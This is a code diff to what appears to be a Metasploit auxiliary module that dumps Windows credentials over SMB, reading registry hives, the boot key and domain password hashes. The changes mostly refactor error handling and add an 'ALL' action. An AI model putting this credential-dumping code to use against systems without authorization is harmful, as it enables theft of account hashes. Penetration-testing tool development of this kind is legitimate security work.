@@ -110,9 +110,6 @@ class MetasploitModule < Msf::Auxiliary
       boot_key << query_info_key_response.lp_class.to_s.encode(::Encoding::ASCII_8BIT)
       @winreg.close_key(subkey_handle)
       subkey_handle = nil
-    rescue RubySMB::Dcerpc::Error::WinregError => e
-      vprint_error("An error occured when retrieving class for #{sub_key}: #{e}")
-      raise e
     ensure
       @winreg.close_key(subkey_handle) if subkey_handle
     end
@@ -141,7 +138,7 @@ class MetasploitModule < Msf::Auxiliary
       @lm_hash_not_stored = false
     end
   rescue RubySMB::Dcerpc::Error::WinregError => e
-    vprint_error("An error occured when checking NoLMHash policy: #{e}")
+    vprint_warning("An error occured when checking NoLMHash policy: #{e}")
   end
 
   def save_registry_key(hive_name)
@@ -153,9 +150,6 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Save key to #{file_name}")
     @winreg.save_key(new_key_handle, file_name)
     file_name
-  rescue RubySMB::Dcerpc::Error::WinregError => e
-    vprint_error("An error occured when saving #{hive_name} key: #{e}")
-    raise e
   ensure
     @winreg.close_key(new_key_handle) if new_key_handle
     @winreg.close_key(root_key_handle) if root_key_handle
@@ -166,9 +160,6 @@ class MetasploitModule < Msf::Auxiliary
     tree2 = simple.client.tree_connect("\\\\#{sock.peerhost}\\ADMIN$")
     file = tree2.open_file(filename: "System32\\#{file_name}", delete: true, read: true)
     file.read
-  rescue RubySMB::Dcerpc::Error::WinregError => e
-    vprint_error("An error occured when retrieving #{hive_name} hive file: #{e}")
-    raise e
   ensure
     file.delete if file
     file.close if file
@@ -440,7 +431,7 @@ class MetasploitModule < Msf::Auxiliary
     if upper_name.start_with?('_SC_')
       # Service name, a password might be there
       # We have to get the account the service runs under
-      account = get_service_account(name[4..-1])
+      account = get_service_account(name[4..])
       if account
         secret = "#{account.encode(::Encoding::UTF_8)}:"
       else
@@ -562,7 +553,7 @@ class MetasploitModule < Msf::Auxiliary
     nb_digits = (Math.log10(users.length) + 1).floor
     users = users.each_with_index.map do |(rid, name), index|
       if index % progress_interval == 0
-        percent = (format('%.2f', (index / users.length.to_f * 100))).rjust(5)
+        percent = format('%.2f', (index / users.length.to_f * 100)).rjust(5)
         print_status("SID enumeration progress - #{index.to_s.rjust(nb_digits)} / #{users.length} (#{percent}%)")
       end
       sid = @samr.samr_rid_to_sid(object_handle: @domain_handle, rid: rid)
@@ -657,11 +648,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_user_record(dcerpc_client, user_record)
-    vprint_status("Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..-1].join.encode('utf-8')}")
+    vprint_status("Decrypting hash for user: #{user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')}")
 
     entinf_struct = user_record.pmsg_out.msg_getchg.p_objects.entinf
-    rid = entinf_struct.p_name.sid[-4..-1].unpack('<L').first
-    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..-1].join.encode('utf-8')
+    rid = entinf_struct.p_name.sid[-4..].unpack('<L').first
+    dn = user_record.pmsg_out.msg_getchg.p_nc.string_name.to_ary[0..].join.encode('utf-8')
 
     result = {
       dn: dn,
@@ -851,20 +842,20 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line("\n# Password history (pwdump format - uid:rid:lmhash:nthash:::):")
+    if @lm_hash_not_stored.nil?
+      print_warning(
+        'NoLMHash policy was not retrieved correctly and we don\'t know if '\
+        'LMHashes are being stored or not. We are assuming it is stored and '\
+        'the lmhash value will be displayed in the following hash. If it is '\
+        "not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})"
+      )
+    end
     user_info.each do |_sid, info|
       full_name = "#{domain_name}\\#{info[:username]}"
 
       if info[:nt_history].size > 1 || info[:lm_history].size > 1
-        info[:nt_history][1..-1].zip(info[:lm_history][1..-1]).reverse.each_with_index do |history, i|
+        info[:nt_history][1..].zip(info[:lm_history][1..]).reverse.each_with_index do |history, i|
           nt_h, lm_h = history
-          if @lm_hash_not_stored.nil? && lm_h
-            print_warning(
-              'NoLMHash policy was not retrieved correctly and we don\'t know if '\
-              'LMHashes are being stored or not. We are assuming it is stored and '\
-              'the lmhash value will be displayed in the following hash. If it is '\
-              "not stored, just replace it with the empty lmhash (#{Net::NTLM.lm_hash('').unpack('H*')[0]})"
-            )
-          end
           lm_h = Net::NTLM.lm_hash('') if lm_h.nil? || @lm_hash_not_stored
           history_hash = "#{lm_h.unpack('H*')[0]}:#{nt_h.unpack('H*')[0]}"
           history_name = "#{full_name}_history#{i}"
@@ -983,7 +974,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       @scm_handle = open_sc_manager
     rescue RubySMB::Error::RubySMBError => e
-      print_error(
+      print_warning(
         'Unable to connect to the remote Service Control Manager. It will fail '\
         "if the 'RemoteRegistry' service is stopped or disabled ([#{e.class}] #{e})."
       )
@@ -1002,10 +993,9 @@ class MetasploitModule < Msf::Auxiliary
       @winreg = @tree.open_file(filename: 'winreg', write: true, read: true)
       @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)
     rescue RubySMB::Error::RubySMBError => e
-      if action.name == 'DOMAIN'
+      if ['DOMAIN', 'ALL'].include?(action.name)
         print_warning(
-          "Error when connecting to 'winreg' interface ([#{e.class}] #{e})... continuing "\
-          'since action is DOMAIN'
+          "Error when connecting to 'winreg' interface ([#{e.class}] #{e})... skipping"
         )
       else
         fail_with(Module::Failure::Unreachable,
@@ -1015,22 +1005,28 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    boot_key = ''
-    begin
-      boot_key = get_boot_key if @winreg
-    rescue RubySMB::Error::RubySMBError => e
-      print_error("Error when getting BootKey: #{e}")
-    end
-    if boot_key.empty?
-      if action.name == 'DOMAIN'
-        print_warning('Unable to get BootKey... continuing since action is DOMAIN')
-      else
-        fail_with(Module::Failure::Unknown,
-                  'Unable to get BootKey. If it is a Domain Controller, you can still '\
-                  'try DOMAIN action since it does not need BootKey')
+    unless action.name == 'DOMAIN'
+      boot_key = ''
+      begin
+        boot_key = get_boot_key if @winreg
+      rescue RubySMB::Error::RubySMBError => e
+        if ['DOMAIN', 'ALL'].include?(action.name)
+          print_warning("Error when getting BootKey... skipping: #{e}")
+        else
+          print_error("Error when getting BootKey: #{e}")
+        end
       end
+      if boot_key.empty?
+        if action.name == 'ALL'
+          print_warning('Unable to get BootKey... skipping')
+        else
+          fail_with(Module::Failure::NotFound,
+                    'Unable to get BootKey. If it is a Domain Controller, you can still '\
+                    'try DOMAIN action since it does not need BootKey')
+        end
+      end
+      report_info(boot_key.unpack('H*')[0], 'host.boot_key')
     end
-    report_info(boot_key.unpack('H*')[0], 'host.boot_key')
 
     check_lm_hash_not_stored if @winreg
 
@@ -1038,7 +1034,11 @@ class MetasploitModule < Msf::Auxiliary
       begin
         sam = save_sam
       rescue RubySMB::Error::RubySMBError => e
-        print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+        if action.name == 'ALL'
+          print_warning("Error when getting SAM hive... skipping ([#{e.class}] #{e}).")
+        else
+          print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+        end
         sam = nil
       end
 
@@ -1052,7 +1052,11 @@ class MetasploitModule < Msf::Auxiliary
       begin
         security = save_security
       rescue RubySMB::Error::RubySMBError => e
-        print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
+        if action.name == 'ALL'
+          print_warning("Error when getting SECURITY hive... skipping ([#{e.class}] #{e}).")
+        else
+          print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
+        end
         security = nil
       end
 
